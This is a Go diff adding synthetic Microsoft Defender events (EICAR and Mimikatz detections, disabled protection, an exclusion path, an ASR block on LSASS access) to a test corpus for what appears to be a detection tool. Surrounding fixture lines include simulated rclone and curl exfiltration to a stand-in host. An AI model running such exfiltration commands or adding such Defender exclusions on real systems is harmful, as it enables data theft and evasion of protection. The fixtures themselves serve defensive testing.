@@ -260,6 +260,22 @@ func (c *corpus) tactics() {
 	proc("pc10", sysmon, 1, 0, `C:\Users\Public\rclone.exe`, `rclone.exe copy C:\Dane mega:kopia --transfers 8`, sys32+"cmd.exe")
 	proc("pc10", sec, 4688, 0, sys32+"curl.exe", "curl.exe -T C:\\Dane\\a.zip https://transfer.example/a.zip", sys32+"cmd.exe")
 	proc("pc10", sysmon, 1, 0, `C:\Users\Public\rclone.exe`, "rclone.exe version", sys32+"cmd.exe")
+	// Microsoft Defender: wykrycie (2× to samo zagrożenie, 1× inne), nieudane
+	// usunięcie, wyłączona ochrona, wykluczenie (zwykła zmiana ustawień – nie),
+	// blokada ASR; udane usunięcie 1117 – nie.
+	def := "Microsoft-Windows-Windows Defender/Operational"
+	eicar := map[string]string{"Threat Name": "Virus:DOS/EICAR_Test_File", "Severity Name": "Severe",
+		"Path": `file:_C:\Temp\eicar.com`, "Detection User": `LAB\jan`}
+	c.add(def, 1116, "pc11", at, 0, eicar)
+	c.add(def, 1116, "pc11", at+time.Minute, 0, eicar)
+	c.add(def, 1116, "pc11", at+2*time.Minute, 0, map[string]string{"Threat Name": "HackTool:Win32/Mimikatz", "Severity Name": "High"})
+	c.add(def, 1117, "pc11", at+time.Minute, 0, eicar)
+	c.add(def, 1119, "pc12", at, 0, map[string]string{"Threat Name": "Trojan:Win32/Agent", "Error Description": "Odmowa dostępu"})
+	c.add(def, 5001, "pc12", at, 0, nil)
+	c.add(def, 5007, "pc12", at, 0, map[string]string{"New Value": `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Users\Public = 0x0`})
+	c.add(def, 5007, "pc12", at, 0, map[string]string{"New Value": `HKLM\SOFTWARE\Microsoft\Windows Defender\Signature Updates\SignatureUpdateInterval = 0x2`})
+	c.add(def, 1121, "pc12", at, 0, map[string]string{"ID": "9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2", "Process Name": `C:\Tools\dump.exe`,
+		"Path": `C:\Windows\System32\lsass.exe`})
 }
 
 // network dodaje zdarzenia urządzeń sieciowych przez prawdziwe dekodery
